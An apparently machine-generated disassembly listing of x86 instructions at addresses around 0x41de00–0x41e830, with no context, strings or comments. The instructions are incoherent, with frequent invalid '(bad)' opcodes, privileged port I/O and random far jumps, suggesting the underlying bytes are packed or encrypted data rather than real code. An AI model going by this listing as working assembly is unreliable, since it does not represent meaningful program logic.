  41decb:	lods   eax,DWORD PTR ds:[esi]
  41decc:	sub    DWORD PTR [ecx+eiz*1+0x7],esi
  41ded0:	jo     0x41df50
  41ded2:	cli    
  41ded3:	jg     0x41de75
  41ded5:	push   ebx
  41ded6:	aad    0xf9
  41ded8:	fcom   DWORD PTR [ebp+ebp*8-0x10]
  41dedc:	pop    esp
  41dedd:	jmp    0xdf83:0xf056eac6
  41dee4:	imul   ecx,DWORD PTR [edi-0xd1fa16f],0xb6710d1b
  41deee:	xchg   esi,eax
  41deef:	stc    
  41def0:	push   DWORD PTR [edx-0x709eb1d9]
  41def6:	adc    DWORD PTR [edi-0x7d],0xd
  41defa:	mov    ds:0x9c41a8b3,eax
  41deff:	mov    cl,0xff
  41df01:	lods   al,BYTE PTR ds:[esi]
  41df02:	jbe    0x41df31
  41df04:	lea    eax,[eax+0x8]
  41df07:	repnz mov bh,0xa
  41df0a:	push   0xffffffab
  41df0c:	adc    eax,0xc91d2abc
  41df11:	dec    ecx
  41df12:	sub    eax,0x37adc803
  41df17:	mov    al,0xcf
  41df19:	add    eax,0x70727a78
  41df1e:	(bad)  
  41df1f:	out    dx,eax
  41df20:	xor    BYTE PTR [edx],dl
  41df22:	adc    edx,DWORD PTR [eax-0x288d62e8]
  41df28:	mov    edi,0xd652ecdb
  41df2d:	pusha  
  41df2e:	std    
  41df2f:	jmp    0x41df63
  41df31:	fild   QWORD PTR [esi]
  41df33:	rcl    BYTE PTR fs:[ebx-0x3eb30113],cl
  41df3a:	fwait
  41df3b:	pop    es
  41df3c:	mov    ?,WORD PTR [ebx+0x10109555]
  41df42:	xor    al,0x0
  41df44:	sbb    cl,BYTE PTR [ebp-0x59cadfbc]
  41df4a:	xchg   edx,eax
  41df4b:	scas   eax,DWORD PTR es:[edi]
  41df4c:	rol    DWORD PTR [edi],0xc8
  41df4f:	sub    eax,0xdd3dc774
  41df54:	sub    eax,ebx
  41df56:	test   DWORD PTR [ebx-0x6818105],ecx
  41df5c:	push   esi
  41df5d:	and    ah,BYTE PTR [edi]
  41df5f:	es sahf 
  41df61:	pop    eax
  41df62:	inc    ecx
  41df63:	cmp    eax,0x64394258
  41df68:	(bad)  
  41df69:	xchg   esp,eax
  41df6a:	xor    eax,0xdb950f26
  41df6f:	pop    eax
  41df70:	cmp    dh,BYTE PTR [edi+0x19394753]
  41df76:	ins    BYTE PTR es:[edi],dx
  41df77:	pop    esi
  41df78:	les    esi,FWORD PTR [edi]
  41df7a:	ret    
  41df7b:	mov    cl,0x1e
  41df7d:	jp     0x41dfa0
  41df7f:	sar    BYTE PTR [edx-0xa],1
  41df82:	mov    ss,WORD PTR [ebp+0x7d]
  41df85:	(bad)  
  41df86:	inc    eax
  41df87:	cmp    eax,0x28ab1b5b
  41df8c:	mov    esi,0x1ac755a4
  41df91:	lahf   
  41df92:	cmp    BYTE PTR es:[esi+0x66],cl
  41df96:	idiv   DWORD PTR [edx]
  41df98:	mov    ebx,0x5d6de203
  41df9d:	sbb    DWORD PTR [eax+0x67504096],edi
  41dfa3:	in     eax,dx
  41dfa4:	sub    al,0xa
  41dfa6:	mov    ch,0x32
  41dfa8:	mov    dh,BYTE PTR [eax+0x1d]
  41dfab:	jbe    0x41dff3
  41dfad:	xchg   edi,eax
  41dfae:	inc    esi
  41dfaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfb0:	cmp    eax,0x59cb817e
  41dfb5:	or     esp,ebp
  41dfb7:	leave  
  41dfb8:	rcl    esi,0x10
  41dfbb:	repnz cmc 
  41dfbd:	add    esp,DWORD PTR [esi-0x61f2bb9d]
  41dfc3:	inc    ebx
  41dfc4:	push   ecx
  41dfc5:	int3   
  41dfc6:	xchg   edx,eax
  41dfc7:	rcl    BYTE PTR [esi],cl
  41dfc9:	push   ebx
  41dfca:	inc    eax
  41dfcb:	xchg   ecx,eax
  41dfcd:	sub    BYTE PTR [edx-0x5848fc94],dl
  41dfd3:	add    eax,0x529efb2a
  41dfd8:	je     0x41dff5
  41dfda:	xchg   esi,eax
  41dfdb:	fwait
  41dfdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfdd:	dec    edx
  41dfde:	pop    es
  41dfdf:	arpl   WORD PTR [edi+0x655637e],ax
  41dfe5:	outs   dx,DWORD PTR ds:[esi]
  41dfe6:	jle    0x41e03e
  41dfe8:	aas    
  41dfe9:	repnz cmp ebx,esp
  41dfec:	es jmp 0x32d2:0x586a6233
  41dff4:	xchg   edx,eax
  41dff5:	fist   DWORD PTR [edx+0x67cf3785]
  41dffb:	inc    ecx
  41dffc:	(bad)  
  41dffd:	into   
  41dffe:	mov    bh,0x91
  41e000:	iret   
  41e001:	mov    bh,0xa7
  41e003:	icebp  
  41e004:	call   0xce356669
  41e009:	nop
  41e00a:	xchg   bl,bh
  41e00c:	jo     0x41e061
  41e00e:	ret    
  41e00f:	dec    eax
  41e010:	scas   eax,DWORD PTR es:[edi]
  41e011:	cmp    BYTE PTR [edi+0x11],bh
  41e014:	adc    DWORD PTR [edi],edi
  41e016:	shl    BYTE PTR [ecx+0x685c81c4],cl
  41e01c:	call   0xd6fd:0x5f9385c
  41e023:	in     al,dx
  41e024:	aas    
  41e025:	mov    DWORD PTR [ebp+edx*8-0x30518772],eax
  41e02c:	xor    al,0xfa
  41e02e:	(bad)  
  41e02f:	call   0xe1a2:0xc836a7d8
  41e036:	mov    esi,0xcf17ca64
  41e03b:	out    dx,eax
  41e03c:	nop
  41e03d:	mov    cl,0xec
  41e03f:	js     0x41dff8
  41e041:	push   esi
  41e042:	xor    BYTE PTR [edx],cl
  41e044:	mov    ds:0x41df4d84,eax
  41e049:	outs   dx,DWORD PTR ds:[esi]
  41e04a:	xor    BYTE PTR [eax],bh
  41e04c:	pop    es
  41e04d:	xchg   esp,eax
  41e04e:	or     ch,dh
  41e050:	je     0x41e096
  41e052:	test   al,0xe3
  41e054:	push   ebx
  41e055:	(bad)  
  41e056:	and    eax,0xd8e56861
  41e05b:	add    DWORD PTR [eax],ebx
  41e05d:	sub    DWORD PTR [esi+0x2d],eax
  41e060:	pop    esp
  41e061:	outs   dx,BYTE PTR ds:[esi]
  41e062:	ror    dl,0xf4
  41e065:	jmp    0x41dfef
  41e067:	jle    0x41e069
  41e069:	xor    cl,ah
  41e06b:	lock retf 0xb3b9
  41e06f:	dec    esp
  41e070:	ins    BYTE PTR es:[edi],dx
  41e071:	sbb    eax,esi
  41e073:	popf   
  41e074:	and    eax,0xf74a821c
  41e079:	sahf   
  41e07a:	mov    dh,BYTE PTR [ebp-0x129498a3]
  41e080:	cmc    
  41e081:	inc    eax
  41e082:	cmp    dh,al
  41e084:	call   0xa238:0xa4d50ad1
  41e08b:	leave  
  41e08c:	inc    edi
  41e08d:	mov    dh,0xd6
  41e08f:	aam    0x40
  41e091:	and    DWORD PTR ds:0x3d32e16,esp
  41e097:	mov    ah,0x96
  41e099:	int3   
  41e09a:	jne    0x41e05b
  41e09c:	mov    bl,0x7d
  41e09e:	jecxz  0x41e0ed
  41e0a0:	mov    edx,0x8f839e91
  41e0a5:	xor    eax,0x4ad6fca6
  41e0aa:	add    dh,BYTE PTR [ebp+0x5c]
  41e0ad:	pop    ds
  41e0ae:	and    al,0xa
  41e0b0:	dec    esi
  41e0b1:	(bad)  [edx]
  41e0b3:	icebp  
  41e0b4:	int3   
  41e0b5:	pop    edi
  41e0b6:	jae    0x41e0dd
  41e0b8:	into   
  41e0b9:	rcl    DWORD PTR [eax+0x19c25750],cl
  41e0bf:	push   esi
  41e0c0:	in     al,dx
  41e0c1:	js     0x41e05d
  41e0c3:	cmp    al,0x77
  41e0c5:	shl    ecx,0x4f
  41e0c8:	push   ecx
  41e0c9:	sahf   
  41e0ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0cb:	pop    ss
  41e0cc:	push   ss
  41e0cd:	adc    eax,0x796e81d0
  41e0d2:	retf   
  41e0d3:	scas   al,BYTE PTR es:[edi]
  41e0d4:	lds    ebx,FWORD PTR [ecx]
  41e0d6:	fstp   DWORD PTR [esi+0x7e3ebfdc]
  41e0dc:	fldcw  WORD PTR [ebp-0x35]
  41e0df:	mov    dh,0xc
  41e0e1:	(bad)  
  41e0e2:	cmp    edi,DWORD PTR [ebx+0x54ff9977]
  41e0e8:	push   ebx
  41e0e9:	mov    dl,0x78
  41e0eb:	aas    
  41e0ec:	repnz sbb eax,esi
  41e0ef:	dec    esi
  41e0f0:	sahf   
  41e0f1:	jge    0x41e09f
  41e0f3:	or     dl,BYTE PTR [edx]
  41e0f5:	outs   dx,DWORD PTR ds:[esi]
  41e0f6:	call   0x3df5:0x9ab6cc60
  41e0fd:	gs cs std 
  41e100:	mov    bh,0x7d
  41e102:	jo     0x41e132
  41e104:	data16 into 
  41e106:	outs   dx,BYTE PTR ds:[esi]
  41e107:	xor    ch,BYTE PTR [eax-0x58]
  41e10a:	mov    al,ds:0x55ea7d13
  41e10f:	and    bh,BYTE PTR [ebx-0x4c]
  41e112:	je     0x41e106
  41e114:	loope  0x41e0d2
  41e116:	repnz dec eax
  41e118:	push   ds
  41e119:	push   0xd090ca55
  41e11e:	cmp    BYTE PTR [ebx-0x57],bl
  41e121:	retf   
  41e122:	bound  ebx,QWORD PTR [ebx]
  41e124:	out    dx,al
  41e125:	cwde   
  41e126:	xor    ah,BYTE PTR [edi+0x633b5c6e]
  41e12c:	idiv   cl
  41e12e:	jle    0x41e0cd
  41e130:	icebp  
  41e131:	xor    eax,0xd206ed2e
  41e136:	outs   dx,BYTE PTR ds:[esi]
  41e137:	pop    ebx
  41e138:	sub    DWORD PTR [ecx+0x79],ecx
  41e13b:	test   dh,dl
  41e13d:	pop    eax
  41e13e:	or     BYTE PTR [eax+esi*4+0x3aa42137],al
  41e145:	loop   0x41e132
  41e147:	stc    
  41e148:	jns    0x41e182
  41e14a:	sub    al,BYTE PTR [esi+0x2c23b781]
  41e150:	cmc    
  41e151:	dec    cl
  41e153:	cs and al,0xf0
  41e156:	mov    eax,ds:0xa69721f3
  41e15b:	mov    es,WORD PTR [esi+esi*2-0x45]
  41e15f:	ss enter 0x8739,0xc1
  41e164:	scas   al,BYTE PTR es:[edi]
  41e165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e166:	bound  eax,QWORD PTR [ebp+0x1]
  41e169:	data16 or al,0xba
  41e16c:	xchg   esp,eax
  41e16d:	pop    ds
  41e16e:	int    0xd3
  41e170:	and    ch,al
  41e172:	arpl   bp,di
  41e174:	lahf   
  41e175:	loopne 0x41e1c4
  41e177:	call   0x1d8b0a1c
  41e17c:	and    dh,bh
  41e17e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e17f:	inc    BYTE PTR [ecx]
  41e181:	pushf  
  41e182:	int    0x7c
  41e184:	push   es
  41e185:	(bad)  
  41e186:	gs add esp,esi
  41e189:	mov    dl,0x2
  41e18b:	dec    esp
  41e18c:	int3   
  41e18d:	cmp    ah,BYTE PTR ds:0xec5fd30a
  41e193:	test   BYTE PTR [ebx],dl
  41e195:	fld    QWORD PTR [ebp+0xe]
  41e198:	mov    al,0xb7
  41e19a:	mov    eax,ds:0x443394fd
  41e19f:	inc    ecx
  41e1a0:	or     ch,BYTE PTR [edx+0x50c24286]
  41e1a6:	mov    ebx,0xce45655a
  41e1ab:	retf   0x14d1
  41e1ae:	cmp    bh,BYTE PTR [esi-0x67622ff]
  41e1b4:	push   edx
  41e1b5:	fild   WORD PTR [edi+0x7d]
  41e1b8:	sub    edi,ecx
  41e1ba:	jae    0x41e218
  41e1bc:	mov    ebp,0xf9b9d2df
  41e1c1:	adc    cl,dh
  41e1c3:	jb     0x41e17f
  41e1c5:	jae    0x41e184
  41e1c7:	lock outs dx,DWORD PTR ds:[esi]
  41e1c9:	cmp    ah,al
	...
  41e3ab:	adc    al,0xcb
  41e3ad:	mov    bl,0x9a
  41e3af:	(bad)  
  41e3b0:	cli    
  41e3b1:	cmp    eax,0x190968cf
  41e3b6:	mov    edi,DWORD PTR [eax+0x79]
  41e3b9:	outs   dx,BYTE PTR ds:[esi]
  41e3ba:	mov    eax,0x1a2a1
  41e3bf:	and    eax,0x27000007
  41e3c4:	aam    0x0
  41e3c6:	daa    
  41e3c7:	push   0xffffffe4
  41e3c9:	cli    
  41e3ca:	push   es
  41e3cb:	adc    DWORD PTR [edi+0x6a],ebp
  41e3ce:	das    
  41e3cf:	sub    ch,BYTE PTR [esi+0x48]
  41e3d2:	cmp    DWORD PTR [ebp-0x4dc1647e],esi
  41e3d8:	pop    edi
  41e3d9:	dec    esp
  41e3da:	fldcw  WORD PTR [edi]
  41e3dc:	push   ebx
  41e3dd:	sahf   
  41e3de:	es js  0x41e408
  41e3e1:	sub    DWORD PTR [ecx],0xe0122f37
  41e3e7:	ret    
  41e3e8:	repnz pop esi
  41e3ea:	xchg   edx,eax
  41e3eb:	jecxz  0x41e3b0
  41e3ed:	mov    bh,BYTE PTR [eax]
  41e3ef:	jne    0x41e37f
  41e3f1:	punpckldq mm3,DWORD PTR [ebp+0x31]
  41e3f5:	push   edi
  41e3f6:	inc    ebp
  41e3f7:	xchg   cl,dl
  41e3f9:	inc    edi
  41e3fa:	jb     0x41e40e
  41e3fc:	shr    BYTE PTR ds:0x9c16506b,0xa1
  41e403:	adc    eax,0x966d76de
  41e408:	sahf   
  41e409:	xchg   ebx,eax
  41e40a:	adc    al,0xc9
  41e40c:	dec    edx
  41e40d:	aad    0x1b
  41e40f:	xchg   ebp,eax
  41e410:	lods   al,BYTE PTR ds:[esi]
  41e411:	push   esp
  41e412:	sahf   
  41e413:	jno    0x41e45a
  41e415:	jl     0x41e3ef
  41e417:	push   edx
  41e418:	pop    ds
  41e419:	scas   eax,DWORD PTR es:[edi]
  41e41a:	call   0x80b5661b
  41e41f:	sbb    eax,0x80b9f16d
  41e424:	push   es
  41e425:	cdq    
  41e426:	dec    edx
  41e427:	into   
  41e428:	repnz cmp ebx,DWORD PTR [esi+0x217a8cbd]
  41e42f:	jg     0x41e44b
  41e431:	cmp    eax,0x4d145ad5
  41e436:	cmp    BYTE PTR [ecx+0x34f4792b],bl
  41e43c:	(bad)  
  41e43d:	ss loopne 0x41e4b7
  41e440:	mov    edx,0x82a4607a
  41e445:	jno    0x41e46b
  41e447:	jo     0x41e42e
  41e449:	mov    cl,0xaa
  41e44b:	mov    esp,0xf065a5d0
  41e450:	push   eax
  41e451:	pop    es
  41e452:	and    al,0x82
  41e454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e455:	inc    ebp
  41e456:	lock sub al,BYTE PTR [edi+0x5e23fd60]
  41e45d:	into   
  41e45e:	push   edx
  41e45f:	cwde   
  41e460:	ss mov ebx,0x852ea3ca
  41e466:	aas    
  41e467:	jp     0x41e42f
  41e469:	daa    
  41e46a:	leave  
  41e46b:	cmp    eax,0x8a77631b
  41e470:	xchg   edi,eax
  41e471:	add    eax,0x999791d3
  41e476:	push   esi
  41e477:	in     al,0x16
  41e479:	add    ch,bh
  41e47b:	xor    DWORD PTR [edx+eax*1+0x354974d8],edx
  41e482:	mov    ebp,0x2b00678
  41e487:	xchg   edi,eax
  41e488:	loopne 0x41e45c
  41e48a:	sbb    eax,0x90422520
  41e48f:	mov    ebx,0x35d005e7
  41e494:	iret   
  41e495:	ror    BYTE PTR [ecx*8+0x345eea92],cl
  41e49c:	gs sub al,0x9e
  41e49f:	add    ecx,0xffffffbc
  41e4a2:	inc    edi
  41e4a3:	pop    edx
  41e4a4:	fsubr  QWORD PTR [ebp+eiz*2-0x19]
  41e4a8:	mov    eax,0x89057236
  41e4ad:	jbe    0x41e4c9
  41e4af:	stc    
  41e4b0:	pop    es
  41e4b1:	or     BYTE PTR [ebp+0x4812b63c],ch
  41e4b7:	bound  ecx,QWORD PTR [edx+0x685f38f3]
  41e4bd:	inc    ecx
  41e4be:	loopne 0x41e532
  41e4c0:	sub    DWORD PTR [ebp+0x32341d2e],eax
  41e4c6:	mov    ch,BYTE PTR [ecx-0x53]
  41e4c9:	jge    0x41e478
  41e4cb:	adc    DWORD PTR [eax],ebp
  41e4cd:	fcmovb st,st(0)
  41e4cf:	mov    ch,0x9e
  41e4d1:	mov    bl,0x10
  41e4d3:	pop    ss
  41e4d4:	cld    
  41e4d5:	pop    eax
  41e4d6:	xchg   edi,eax
  41e4d7:	shl    BYTE PTR [eax-0x2e],1
  41e4da:	cmp    eax,0x85ee053d
  41e4df:	xor    al,al
  41e4e1:	sahf   
  41e4e2:	pop    edx
  41e4e3:	sub    eax,DWORD PTR [eax+0x56]
  41e4e6:	repz sub BYTE PTR [esi],bl
  41e4e9:	jg     0x41e4ea
  41e4eb:	or     bl,BYTE PTR [ecx-0x65]
  41e4ee:	js     0x41e4b8
  41e4f0:	ja     0x41e4fe
  41e4f2:	pop    ds
  41e4f3:	pop    ebx
  41e4f4:	jg     0x41e47f
  41e4f6:	dec    edi
  41e4f7:	push   ebx
  41e4f8:	or     bh,dh
  41e4fa:	stos   DWORD PTR es:[edi],eax
  41e4fb:	push   eax
  41e4fc:	out    0x39,eax
  41e4fe:	idiv   DWORD PTR [ecx+0x602cf661]
  41e504:	out    0xcb,eax
  41e506:	sbb    DWORD PTR [ebp+ecx*4-0x610e6d89],0xb90091aa
  41e511:	sub    ch,BYTE PTR [esp+ebx*2+0xb2dd9a0]
  41e518:	and    eax,0xd1a288e2
  41e51d:	fisttp QWORD PTR [ebx-0x6e]
  41e520:	in     eax,dx
  41e521:	adc    BYTE PTR [edi-0x661439e1],bh
  41e527:	hlt    
  41e528:	(bad)  
  41e52a:	adc    esp,DWORD PTR [ecx-0x3c]
  41e52d:	adc    BYTE PTR [esi],0x5d
  41e530:	add    al,0xfd
  41e532:	cmp    BYTE PTR [ebx-0x64119287],0x3
  41e539:	mov    bh,0x5
  41e53b:	fadd   DWORD PTR [esi+0xa]
  41e53e:	test   BYTE PTR [ecx-0xb],dl
  41e541:	xchg   DWORD PTR [edi-0x74124941],esi
  41e547:	jmp    0xff03:0xc09c1334
  41e54e:	fnstcw WORD PTR ds:0xed9d6229
  41e554:	sub    eax,0xff521fcf
  41e559:	gs pop ss
  41e55b:	cmp    bl,BYTE PTR [eax+0x7d]
  41e55e:	ins    DWORD PTR es:[edi],dx
  41e55f:	sub    BYTE PTR [ecx+0x53],dh
  41e562:	daa    
  41e563:	push   ss
  41e564:	ret    0x9750
  41e567:	jmp    0x41e56e
  41e569:	ins    BYTE PTR es:[edi],dx
  41e56a:	test   DWORD PTR [edi+0x62],esp
  41e56d:	ficom  WORD PTR [edx-0x522b4f0a]
  41e573:	iret   
  41e574:	aam    0x76
  41e576:	dec    eax
  41e577:	adc    ebx,ecx
  41e579:	call   0xa9528736
  41e57e:	test   al,0x6e
  41e580:	sti    
  41e581:	mov    esi,0xb844d928
  41e586:	(bad)  
  41e587:	out    0x63,eax
  41e589:	inc    esp
  41e58a:	pop    ss
  41e58b:	call   0xd041c331
  41e590:	test   eax,0x17cc5121
  41e595:	adc    DWORD PTR [edx+ebx*2],ebp
  41e598:	das    
  41e599:	scas   al,BYTE PTR es:[edi]
  41e59a:	dec    esi
  41e59b:	stc    
  41e59c:	xor    bh,BYTE PTR [eax+ebx*8+0x1c]
  41e5a0:	xchg   esi,eax
  41e5a1:	mov    dh,0x92
  41e5a3:	jne    0x41e55d
  41e5a5:	mov    ch,0xf8
  41e5a7:	out    0xd6,eax
  41e5a9:	mov    ecx,0xc362a1b2
  41e5ae:	fcomip st,st(1)
  41e5b0:	adc    BYTE PTR [esi],ch
  41e5b2:	enter  0x55a6,0x1c
  41e5b6:	xchg   edi,eax
  41e5b7:	dec    edx
  41e5b8:	lods   eax,DWORD PTR ds:[esi]
  41e5b9:	dec    edx
  41e5ba:	inc    ecx
  41e5bb:	pusha  
  41e5bc:	pop    edi
  41e5bd:	popa   
  41e5be:	jl     0x41e567
  41e5c0:	mov    dl,BYTE PTR es:[eax-0x3c98be90]
  41e5c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5c8:	sub    al,0xc2
  41e5ca:	(bad)  
  41e5cb:	pusha  
  41e5cc:	popf   
  41e5cd:	(bad)  
  41e5ce:	sub    eax,0xc2406ad5
  41e5d3:	push   ebx
  41e5d4:	mov    dl,0xed
  41e5d6:	mov    bh,al
  41e5d8:	scas   eax,DWORD PTR es:[edi]
  41e5d9:	add    BYTE PTR [edx+0x2],0x76
  41e5dd:	push   ds
  41e5de:	fisub  WORD PTR [eax+0x2f]
  41e5e1:	xchg   BYTE PTR [esi-0x478022a6],ah
  41e5e7:	test   DWORD PTR [edi],ebp
  41e5e9:	lods   eax,DWORD PTR ds:[esi]
  41e5ea:	mov    dh,0x5b
  41e5ec:	dec    esi
  41e5ed:	or     DWORD PTR [ecx+0x5e5e009a],eax
  41e5f3:	sub    BYTE PTR [edi-0x1c],bl
  41e5f6:	lar    esp,WORD PTR [ebx]
  41e5f9:	and    BYTE PTR [ebx-0x73],al
  41e5fc:	in     eax,0x98
  41e5fe:	aaa    
  41e5ff:	sub    esp,0x57f3b720
  41e605:	push   eax
  41e606:	xchg   ecx,eax
  41e607:	mov    WORD PTR [edi+0xced135f],gs
  41e60d:	and    ecx,DWORD PTR [ecx+0x55]
  41e610:	push   ebx
  41e611:	inc    edi
  41e612:	dec    al
  41e614:	push   esi
  41e615:	ds lock lahf 
  41e618:	(bad)
  41e61c:	push   ecx
  41e61d:	add    ch,ch
  41e61f:	lahf   
  41e620:	dec    eax
  41e621:	ja     0x41e655
  41e623:	sub    BYTE PTR [ebp+0x64d95871],0xd3
  41e62a:	mov    ecx,0xa076ce48
  41e62f:	xchg   ecx,eax
  41e630:	dec    ebx
  41e631:	mov    esp,0x52cc5043
  41e636:	sbb    cl,al
  41e638:	xchg   BYTE PTR [esi],bh
  41e63a:	lods   eax,DWORD PTR ds:[esi]
  41e63b:	sub    dh,ah
  41e63d:	mov    ds:0xc1598efe,al
  41e642:	rol    DWORD PTR [ebx+0x6],0xf2
  41e646:	pop    ecx
  41e647:	fwait
  41e648:	sub    DWORD PTR [esi+ebx*2],esi
  41e64b:	adc    eax,0x1f474eec
  41e650:	fs mov edx,0xf081d0fc
  41e656:	out    dx,eax
  41e657:	pop    ds
  41e658:	jmp    0x92d19970
  41e65d:	lods   al,BYTE PTR ds:[esi]
  41e65e:	lods   eax,DWORD PTR ds:[esi]
  41e65f:	repz sbb eax,0x8ffdeb2c
  41e665:	mov    BYTE PTR ds:0x748975aa,dl
  41e66b:	cmp    dh,bh
  41e66d:	push   esp
  41e66e:	ja     0x41e6e8
  41e670:	xchg   DWORD PTR [edx-0x37],esp
  41e673:	jmp    0x41e6ee
  41e675:	(bad)  
  41e677:	sub    al,0x2a
  41e679:	arpl   WORD PTR ds:0xeabaac17,cx
  41e67f:	xchg   esp,eax
  41e680:	adc    ch,bh
  41e682:	icebp  
  41e683:	sbb    al,0x9d
  41e685:	lds    ebp,FWORD PTR [eax+0x4293e97a]
  41e68b:	pop    ds
  41e68c:	mov    cl,0xa5
  41e68e:	sub    DWORD PTR [edi+ebx*1],edi
  41e691:	sbb    edi,edx
  41e693:	imul   ebx,DWORD PTR [ebp-0x3929a77b],0xb2aa7d08
  41e69d:	cwde   
  41e69e:	xlat   BYTE PTR ds:[ebx]
  41e69f:	mov    cl,0x9c
  41e6a1:	bound  edx,QWORD PTR [ebx]
  41e6a3:	inc    edx
  41e6a4:	inc    ebx
  41e6a5:	xchg   DWORD PTR [ebx+0x5ee65614],eax
  41e6ab:	(bad)  
  41e6ac:	fcomip st,st(1)
  41e6ae:	repnz nop
  41e6b0:	iret   
  41e6b1:	push   esp
  41e6b2:	mov    bl,0x95
  41e6b4:	mov    dl,0x70
  41e6b6:	add    eax,0xa57e055
  41e6bb:	inc    ebp
  41e6bc:	sahf   
  41e6bd:	fdiv   st(7),st
  41e6bf:	cli    
  41e6c0:	lock push edi
  41e6c2:	jmp    0x41e709
  41e6c4:	or     bh,BYTE PTR [edi]
  41e6c6:	stos   BYTE PTR es:[edi],al
  41e6c7:	call   0xaaaf81ae
  41e6cc:	xchg   DWORD PTR [ebp+eax*4+0x6d233b84],ecx
  41e6d3:	mov    ebx,0x9ed6aaa6
  41e6d8:	mov    al,ds:0x8917e033
  41e6dd:	lods   al,BYTE PTR ds:[esi]
  41e6de:	xor    eax,0xf280e807
  41e6e3:	push   cs
  41e6e4:	int    0x24
  41e6e6:	in     al,0x6e
  41e6e8:	js     0x41e6e8
  41e6ea:	leave  
  41e6eb:	jl     0x41e6cc
  41e6ed:	in     eax,dx
  41e6ee:	adc    eax,0xb09652ed
  41e6f3:	pop    eax
  41e6f4:	stc    
  41e6f5:	adc    al,0xd2
  41e6f7:	(bad)  
  41e6f8:	loopne 0x41e72b
  41e6fa:	xchg   ebp,eax
  41e6fb:	jp     0x41e703
  41e6fd:	mov    ds:0x917fe875,eax
  41e702:	idiv   BYTE PTR [edx-0x2b4feda3]
  41e708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e709:	mov    edi,0x3b478e40
  41e70e:	(bad)  [ebp+0xc]
  41e711:	pop    esp
  41e712:	in     eax,0x60
  41e714:	(bad)  
  41e715:	mov    cl,0xda
  41e717:	data16 (bad) 
  41e71a:	jl     0x41e761
  41e71c:	adc    DWORD PTR [esi],0xfffffffa
  41e71f:	js     0x41e731
  41e721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e722:	mov    cl,BYTE PTR [edx-0x57400eb3]
  41e728:	loopne 0x41e773
  41e72a:	push   esp
  41e72b:	(bad)  
  41e72c:	jp     0x41e791
  41e72e:	mov    eax,ds:0xc6a6020d
  41e733:	xchg   esi,eax
  41e734:	add    BYTE PTR [edx],dl
  41e736:	xor    al,0xfd
  41e738:	push   edx
  41e739:	les    ebp,FWORD PTR [ecx-0x6f60e159]
  41e73f:	and    eax,0x8bbbfa97
  41e744:	je     0x41e79d
  41e746:	dec    ecx
  41e747:	cmp    esi,DWORD PTR [ebx]
  41e749:	neg    ebp
  41e74b:	jb     0x41e7c6
  41e74d:	fcmovnb st,st(5)
  41e74f:	popa   
  41e750:	cmp    DWORD PTR [edi-0x43],eax
  41e753:	aad    0xcc
  41e755:	in     al,0x19
  41e757:	stos   DWORD PTR es:[edi],eax
  41e758:	mov    eax,ds:0x35dfabc7
  41e75d:	js     0x41e758
  41e75f:	jnp    0x41e7de
  41e761:	cli    
  41e762:	xor    al,0x6d
  41e764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e765:	stos   DWORD PTR es:[edi],eax
  41e766:	shl    BYTE PTR [esp+ebx*8+0x74f64f41],cl
  41e76d:	mov    esi,0x2b9fd60c
  41e772:	push   ecx
  41e773:	sub    al,0xea
  41e775:	push   cs
  41e776:	aam    0x9b
  41e778:	push   esp
  41e779:	sahf   
  41e77a:	inc    ebp
  41e77b:	in     eax,dx
  41e77c:	jns    0x41e759
  41e77e:	enter  0xeb44,0x2b
  41e782:	loope  0x41e74e
  41e784:	xchg   esi,eax
  41e785:	test   eax,0x2afa2755
  41e78a:	pop    es
  41e78b:	sahf   
  41e78c:	mov    eax,ds:0xc7619116
  41e791:	push   ebx
  41e792:	inc    DWORD PTR [edi+0x32]
  41e795:	lea    eax,[esi]
  41e797:	fild   WORD PTR [ecx]
  41e799:	nop
  41e79a:	or     BYTE PTR [ebx+0x1af2b453],cl
  41e7a0:	jmp    0x41e79d
  41e7a2:	pop    es
  41e7a3:	(bad)  [edi]
  41e7a5:	jae    0x41e7db
  41e7a7:	mov    bh,0x5a
  41e7a9:	bsr    ebp,esp
  41e7ac:	mov    edi,0x915bef6a
  41e7b1:	sub    eax,0x5d007b9c
  41e7b6:	jmp    0x41e790
  41e7b8:	dec    edx
  41e7b9:	xchg   edx,eax
  41e7ba:	xchg   ebp,eax
  41e7bb:	(bad)  
  41e7bc:	and    eax,0x3db2ca09
  41e7c1:	mov    bl,0xf3
  41e7c3:	jno    0x41e81b
  41e7c5:	inc    ebp
  41e7c6:	and    al,0x98
  41e7c8:	rol    ah,1
  41e7ca:	xchg   edx,eax
  41e7cb:	in     al,dx
  41e7cc:	pop    ds
  41e7cd:	pushf  
  41e7ce:	push   ecx
  41e7cf:	jnp    0x41e835
  41e7d1:	jmp    0x4cbb:0xa417284e
  41e7d8:	mov    bh,0xd8
  41e7da:	lds    esi,FWORD PTR [ebx-0x5adf019c]
  41e7e0:	push   es
  41e7e1:	jecxz  0x41e812
  41e7e3:	gs mov ch,0xac
  41e7e6:	mov    esi,?
  41e7e8:	pop    cx
  41e7ea:	mov    edx,0xd266b107
  41e7ef:	push   esi
  41e7f0:	sbb    eax,0xefb2ac98
  41e7f5:	outs   dx,BYTE PTR ds:[esi]
  41e7f6:	in     al,dx
  41e7f7:	sbb    DWORD PTR [ecx-0x2bda88dc],edx
  41e7fd:	cdq    
  41e7fe:	test   eax,0x99e95df1
  41e803:	fadd   st,st(1)
  41e805:	inc    ebp
  41e806:	mov    cl,0x2f
  41e808:	add    BYTE PTR [ecx],bh
  41e80a:	cli    
  41e80b:	inc    edx
  41e80c:	out    dx,al
  41e80d:	test   DWORD PTR [edx+0x1d294561],0xa33f2693
  41e817:	inc    ebp
  41e818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e819:	sbb    bl,BYTE PTR [edi+0x3117f97d]
  41e81f:	test   eax,0x17284084
  41e824:	cs rol ebp,cl
  41e827:	adc    al,0x51
  41e829:	ins    DWORD PTR es:[edi],dx
  41e82a:	dec    edi
  41e82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e82c:	jo     0x41e801
  41e82e:	ret    
  41e82f:	adc    al,0xce
